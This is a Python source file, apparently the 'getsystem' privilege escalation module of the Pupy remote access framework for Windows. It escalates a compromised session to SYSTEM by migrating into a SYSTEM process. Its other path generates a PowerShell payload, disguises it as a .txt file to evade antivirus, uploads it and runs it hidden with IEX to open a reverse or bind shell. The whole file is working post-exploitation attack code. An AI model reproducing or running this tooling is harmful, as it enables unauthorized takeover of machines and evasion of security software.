# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib.utils.rpyc_utils import redirected_stdo
from modules.lib.windows.migrate import migrate
from rpyc.utils.classic import upload

import os
import pupygen
import string
import random

__class_name__="GetSystem"

@config(compat="windows", category="privesc")
class GetSystem(PupyModule):

    """
    Try to get NT AUTHORITY SYSTEM privileges

    - Case 1: If the launcher on the target uses a reverse connection (e.g. connect or auto_proxy), this module will migrate on a created System process by default.
    In this case, the created System launcher will connect to your pupy contoller automatically.
    - Case 2: If the launcher on the target uses a bind connection, this module will enable the 'powershell' option by default.
    In this case, a ps1 script will be uploaded and it will be executed as System on the target (without migration by default).
    This ps1 script listens on your given port on the target. You have to connect to this launcher manually.
    """

    dependencies=["pupwinutils.security"]

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="getsystem", description=cls.__doc__)
        cls.arg_parser.add_argument("--prog", default="cmd.exe", help="Change the default process to create/inject into")
        cls.arg_parser.add_argument('-m', dest='migrate', action='store_true', default=True, help="Used by default: migrate to the system process (could be detected by AV)")
        cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help="Restart current executable as admin")
        cls.arg_parser.add_argument('-p', dest='powershell', action='store_true', default=False, help="Use powershell to automatically get a reverse shell")
        cls.arg_parser.add_argument('-k', dest='keep', action='store_true', default=False, help="Keep this current connection after migration (default: %(default)s)")
        cls.arg_parser.add_argument('-t', dest='timeout', default=60, type=int, help="Wait n seconds a reverse connection during migration (default: %(default)s)")

    def run(self, args):

        local_file  = ''
        #True if ps1 script will be used in bind mode. If reverse connection with ps1 then False
        isBindLauncherForPs1 = False
        #Contains ip:port used for bind connection on the target with ps1 script. None if reverse connection and (consequently) isBindLauncherForPs1==False
        listeningAddressPortForBindPs1 = None
        #Usefull information for bind mode connection (ps1 script)
        launcherType, addressPort = self.client.desc['launcher'], self.client.desc['address']
        #Case of a pupy bind shell if ps1 mode is used (no reverse connection possible)
        if launcherType == "bind":
            self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))
            isBindLauncherForPs1 = True
            self.info('Consequently, powershell option is enabled')
            args.powershell = True
        else:
            self.info('The current pupy launcher is using a REVERSE connection (e.g. \'auto_proxy\' or \'connect\' launcher)')
            isBindLauncherForPs1 = False

        # restart current exe as system
        if args.restart:
            self.info('Using current executable')
            exe = self.client.desc['exec_path'].split('\\')
            if exe[len(exe)-1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':
                self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])
                self.warning('It is not recommended to restart it')
                return

            cmd = self.client.desc['exec_path']

        # use powerhell to get a reverse shell
        elif args.powershell or isBindLauncherForPs1:
            clientConfToUse = None
            ros         = self.client.conn.modules['os']
            rtempfile   = self.client.conn.modules['tempfile']
            tempdir     = rtempfile.gettempdir()
            random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])
            remotefile  = ''

            if isBindLauncherForPs1:
                self.info('Using powershell payload because the launcher on the target uses a bind connection. Launcher listens on {0}'.format(addressPort))
                self.info("Bind launcher used. So a BIND ps1 will be used in child launcher. This ps1 will listen on your given port")
                self.info("Be careful, you have to choose a port which is not used on the target!")
                listeningPort = -1
                while listeningPort==-1:
                    try:
                        listeningPort = int(input("[?] Give me the listening port to use on the target: "))
                    except Exception as e:
                        self.warning("You have to give me a valid port. Try again. ({})".format(e))
                listeningAddress = addressPort.split(':')[0]
                listeningAddressPortForBindPs1 = "{0}:{1}".format(listeningAddress, listeningPort)
                self.info("The ps1 script used for get a System pupy shell will be configured for listening on {0} on the target".format(listeningAddressPortForBindPs1))
                bindConf = self.client.get_conf()
                #Modify the listening port on the conf. If it is not modified, the ps1 script will listen on the same port as the inital pupy launcher on the target
                bindConf['launcher_args'][bindConf['launcher_args'].index("--port")+1] = str(listeningPort)
                clientConfToUse = bindConf
            else:
                self.info('Using powershell payload because you have chosen this option. The launcher on the target uses a reverse connection')
                clientConfToUse = self.client.get_conf()
            if '64' in  self.client.desc['proc_arch']:
                local_file = pupygen.generate_ps1(clientConfToUse, x64=True)
            else:
                local_file = pupygen.generate_ps1(clientConfToUse, x86=True)

            # change the ps1 to txt file to avoid AV detection
            random_name += '.txt'
            remotefile  = ros.path.join(tempdir, random_name)

            cmd     = u'C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe'
            param   = u'-w hidden -noni -nop -c "cat %s | Out-String | IEX"' % remotefile

            cmd = '%s %s' % (cmd, param)

            self.info("Uploading file in %s" % remotefile)
            upload(self.client.conn, local_file, remotefile)

        # migrate
        else:
            cmd     = args.prog

        with redirected_stdo(self):
            proc_pid = self.client.conn.modules["pupwinutils.security"].getsystem(prog=cmd)

        if args.migrate and not args.restart and not args.powershell:
            migrate(self, proc_pid, keep=args.keep, timeout=args.timeout)
            self.success("got system !")
        else:
            if isBindLauncherForPs1:
                self.success("You have to connect to the target manually on {0}: try 'connect --host {0}' in pupy shell".format(listeningAddressPortForBindPs1))
            else:
                self.success("Waiting for a connection (take few seconds, 1 min max)...")

        if args.powershell:
            os.remove(local_file)
